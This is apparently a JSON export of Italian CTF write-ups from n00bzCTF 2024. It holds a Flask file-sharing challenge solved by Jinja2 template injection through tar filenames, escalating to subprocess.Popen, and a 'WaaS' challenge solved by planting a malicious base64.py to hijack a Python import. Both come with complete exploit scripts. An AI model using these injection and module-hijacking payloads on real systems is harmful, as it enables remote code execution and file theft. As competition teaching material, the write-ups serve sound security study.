[{"content":" File Sharing Portal Descrizione: Benvenuti nel portale di condivisione dei file! Supportiamo solo file tar!\nAutori: NoobMaster + NoobHacker\nPunti: 478\nSoluzioni: 119\nIntroduction Il ctf ha una struttura molto semplice: abbiamo un form in cui ci viene chiesto di inserire un file tar; una volta inserito il file tar, questo viene decompresso e ci viene mostrato il nome dei file che contiene; cliccando sui diversi file, possiamo leggerne il contenuto.\nSource Il sorgente ha commenti aggiunti in seguito per consentire una migliore comprensione del codice nei writeup\n# filename: server.py #!/usr/bin/env python3 from flask import Flask, request, redirect, render_template, render_template_string import tarfile from hashlib import sha256 import os app = Flask(__name__) @app.route('/',methods=['GET','POST']) def main(): # Questa funzione si occupa principalmente di caricare il file tar nel file system del server. global username if request.method == 'GET': return render_template('index.html') elif request.method == 'POST': file = request.files['file'] if file.filename[-4:] != '.tar': # Verificare che il file passato sia effettivamente un file tar return render_template_string(\u0026quot;\u0026lt;p\u0026gt; We only support tar files as of right now!\u0026lt;/p\u0026gt;\u0026quot;) # Altrimenti, viene visualizzato un messaggio di errore name = sha256(os.urandom(16)).digest().hex() # Crea un nome casuale che verrà utilizzato per denominare il tar e la cartella nel file system del server. os.makedirs(f\u0026quot;./uploads/{name}\u0026quot;, exist_ok=True) # Crea la directory file.save(f\u0026quot;./uploads/{name}/{name}.tar\u0026quot;) # Salva il file tar try: # Estrae il file tar tar_file = tarfile.TarFile(f'./uploads/{name}/{name}.tar') tar_file.extractall(path=f'./uploads/{name}/') return render_template_string(f\u0026quot;\u0026lt;p\u0026gt;Tar file extracted! View \u0026lt;a href='/view/{name}'\u0026gt;here\u0026lt;/a\u0026gt;\u0026quot;) except: return render_template_string(\u0026quot;\u0026lt;p\u0026gt;Failed to extract file!\u0026lt;/p\u0026gt;\u0026quot;) @app.route('/view/\u0026lt;name\u0026gt;') def view(name): # Questa funzione visualizza i file contenuti nel file .tar if not all([i in \u0026quot;abcdef1234567890\u0026quot; for i in name]): # Controllare che il nome del file sia in esadecimale, per evitare qualsiasi tipo di input dannoso. return render_template_string(\u0026quot;\u0026lt;p\u0026gt;Error!\u0026lt;/p\u0026gt;\u0026quot;) #print(os.popen(f'ls ./uploads/{name}').read()) #print(name) files = os.listdir(f\u0026quot;./uploads/{name}\u0026quot;) # Elenca tutti i file presenti nella cartella precedentemente creata out = '\u0026lt;h1\u0026gt;Files\u0026lt;/h1\u0026gt;\u0026lt;br\u0026gt;' files.remove(f'{name}.tar') # Rimuove il file tar dall'elenco for i in files: out += f'\u0026lt;a href=\u0026quot;/read/{name}/{i}\u0026quot;\u0026gt;{i}\u0026lt;/a\u0026gt;' # Mostra tramite modelli tutti i nomi dei file # except: return render_template_string(out) # Renderizzare il modello con la funzione render_template_string @app.route('/read/\u0026lt;name\u0026gt;/\u0026lt;file\u0026gt;') def read(name,file): # La funzione mostra il contenuto del singolo file if (not all([i in \u0026quot;abcdef1234567890\u0026quot; for i in name])): # Controllare che il nome del file sia in esadecimale, per evitare qualsiasi tipo di input dannoso. return render_template_string(\u0026quot;\u0026lt;p\u0026gt;Error!\u0026lt;/p\u0026gt;\u0026quot;) if ((\u0026quot;..\u0026quot; in name) or (\u0026quot;..\u0026quot; in file)) or ((\u0026quot;/\u0026quot; in file) or \u0026quot;/\u0026quot; in name): # Altri controlli per evitare l'errore di percorso return render_template_string(\u0026quot;\u0026lt;p\u0026gt;Error!\u0026lt;/p\u0026gt;\u0026quot;) f = open(f'./uploads/{name}/{file}') # Apre il file data = f.read() f.close() return data # Ritorna il contenuto del file if __name__ == '__main__': app.run(host='0.0.0.0', port=1337) Si può quindi notare che ci sono diversi controlli sui parametri e, in un primo momento, si potrebbe pensare che il codice sia sicuro al 100%.\nSolution La prima cosa che ci è venuta in mente è stata quella di creare un link simbolico per accedere alla flag, e in effetti questo funziona (provate con server.py), il problema è che il nome del file della flag è sconosciuto e questo non ci permette di creare un link simbolico valido.\nUna volta capito questo, abbiamo fatto un\u0026rsquo;analisi approfondita del codice e siamo giunti alla conclusione che l\u0026rsquo;unica cosa che non veniva controllata era il nome del file tar scompattato, consentendoci di inserire qualsiasi cosa. Combinando questo con la funzione render_template_string (una funzione vulnerabile di flask), è possibile eseguire una template injection.\n# filename: exploit.py import requests import os import tarfile from bs4 import BeautifulSoup url = 'http://redacted.challs.n00bzunit3d.xyz:8080/' def create_tar(tar_name, file): with tarfile.open(tar_name, 'w') as tar: tar.add(file, arcname=os.path.basename(file)) print(f'Tar file created: {tar_name}') def create_payload(payload): with open(payload, 'w') as f: f.write('Remember to byte the cookies') create_tar('exploit.tar', payload) print(f'Payload created: {payload}') def get_url_view(text): soup = BeautifulSoup(text, 'html5lib') return [a['href'] for a in soup.find_all('a', href=True)][0] def leak_subprocess_index(): payload = \u0026quot;{{int.__class__.__base__.__subclasses__()}}\u0026quot; create_payload(payload) r = requests.post(url, files={'file': open('exploit.tar', 'rb')}) url_file = get_url_view(r.text) r = requests.get(url + url_file) text = r.text[r.text.index('[')+1:] list_classes = text.split(',') for i, c in enumerate(list_classes): if 'subprocess.Popen' in c: print(f'Index subprocess.Popen: {i}') return str(i) def get_flag(index): payload = \u0026quot;{{int.__class__.__base__.__subclasses__()[\u0026quot; + \\ index + \u0026quot;]('cat *', shell=True, stdout=-1).communicate()}}\u0026quot; create_payload(payload) r = requests.post(url, files={'file': open('exploit.tar', 'rb')}) url_file = get_url_view(r.text) r = requests.get(url + url_file) flag = r.text[r.text.index('n00bz{'):r.text.index('}')+1] print(f'Flag: {flag}') def main(): subprocess_index = leak_subprocess_index() get_flag(subprocess_index) if __name__ == '__main__': main() flag: n00bz{n3v3r_7rus71ng_t4r_4g41n!_b3506983087e} Author: akiidjk ","permalink":"http://localhost:1313/it/writeups/noobzctf/filesharingportal/","title":"File Sharing Portal"},{"content":" Waas Descrizione: Writing as a Service!\nAutori: NoobMaster + NoobHacker\nPunti: 491\nSoluzioni: 78\nIntroduction WaaS (Writing as a Service) ci permette di sovrascrivere un file sul sistema (dopo un certo controllo dell\u0026rsquo;input) e di inserirvi tutto ciò che vogliamo (fino a quando non si incontra un newline).\nimport subprocess from base64 import b64decode as d while True: print(\u0026quot;[1] Write to a file\\n[2] Get the flag\\n[3] Exit\u0026quot;) try: inp = int(input(\u0026quot;Choice: \u0026quot;).strip()) except: print(\u0026quot;Invalid input!\u0026quot;) exit(0) if inp == 1: file = input(\u0026quot;Enter file name: \u0026quot;).strip() assert file.count('.') \u0026lt;= 2 # Why do you need more? assert \u0026quot;/proc\u0026quot; not in file # Why do you need to write there? assert \u0026quot;/bin\u0026quot; not in file # Why do you need to write there? assert \u0026quot;\\n\u0026quot; not in file # Why do you need these? assert \u0026quot;chall\u0026quot; not in file # Don't be overwriting my files! try: f = open(file,'w') except: print(\u0026quot;Error! Maybe the file does not exist?\u0026quot;) f.write(input(\u0026quot;Data: \u0026quot;).strip()) f.close() print(\u0026quot;Data written sucessfully!\u0026quot;) if inp == 2: flag = subprocess.run([\u0026quot;cat\u0026quot;,\u0026quot;fake_flag.txt\u0026quot;],capture_output=True) # You actually thought I would give the flag? print(flag.stdout.strip()) Solution In un primo momento si potrebbe pensare di provare a bypassare la validazione dell\u0026rsquo;input, magari riscrivendo il funzionamento del comando cat o del file di sfida stesso, ma questo non è possibile. Una cosa molto bizzarra è l\u0026rsquo;importato ma inutilizzato b64decode dal modulo base64, che è ciò che ci permette di risolvere la sfida.\nQuando python importa i moduli, guarda in sys.path, che ha un elenco di directory valide da cui importare i moduli. Dopo una rapida ricerca nei python3 docs, scopriamo che la prima directory in cui cerca è la stessa directory in cui si trova il file, il che significa che se abbiamo un file base64.py nella directory, allora python cercherà di importare un simbolo b64decode da quel file, invece del comune modulo conosciuto. Un\u0026rsquo;altra caratteristica del comportamento di importazione di python che possiamo usare è che tutto il codice di un modulo importato sarà eseguito. Per esempio, se un file test.py ha print('Hello, World!') e può essere eseguito (per esempio se è al livello di indentazione più basso), un file con import test vedrà effettivamente Hello, World! stampato su stdout. Pertanto, poiché la funzione open con un flag 'w' creerà un file se non esiste, possiamo semplicemente creare un file chiamatobase64.py` e scriverci dentro il nostro codice malevolo.\nQualcosa del genere farà al caso vostro:\nimport os; b64decode = 0; os.system(\u0026quot;cat flag.txt\u0026quot;) Ma il flag non è ancora nostro; dobbiamo sfruttare il fatto che l\u0026rsquo;istanza non resetta i suoi file ogni volta che ci si connette, il che significa che il nostro base64.py rimarrà nella cartella per tutta la durata dell\u0026rsquo;istanza. Questo significa che dobbiamo semplicemente riconnetterci e ottenere il nostro flag.\nsolve.py\nfrom pwn import * def solve(): r = remote('challs.n00bzunit3d.xyz', 10478) # PORT depends on the instance r.sendlineafter(b'Choice: ', b'1') # 1 to write a file r.sendlineafter(b'Enter file name: ', b'base64.py') r.sendlineafter(b'Data: ', b'import os; b64decode = 0; os.system(\u0026quot;cat flag.txt\u0026quot;)') r.close() r = remote('challs.n00bzunit3d.xyz', 10478) # PORT depends on the instance flag = r.recvline().decode() print(f'flag: {flag}') r.close() if __name__ == '__main__': solve() $ flag: n00bz{0v3rwr1t1ng_py7h0n3_m0dul3s?!!!_f5c63f47af0e} Author: vympel\n","permalink":"http://localhost:1313/it/writeups/noobzctf/waas/","title":"WaaS"},{"content":" N00bz CTF 2024 Description Un CTF di 48 ore ospitato da n00bz per n00bz. Organizzato con sfide facili per i principianti (e alcune difficili), n00bzCTF è dedicato a rendere la sicurezza informatica più amichevole e avvicinabile per i n00bz completi.\nPerformance Summary CTFs: 31/32 Punti totali: 9794.000 Posizione: 24 Punti di valutazione: 24.067 Writeups Web File Sharing Portal Misc Waas ","permalink":"http://localhost:1313/it/writeups/n00bzctf/","title":"N00bzCTF"}]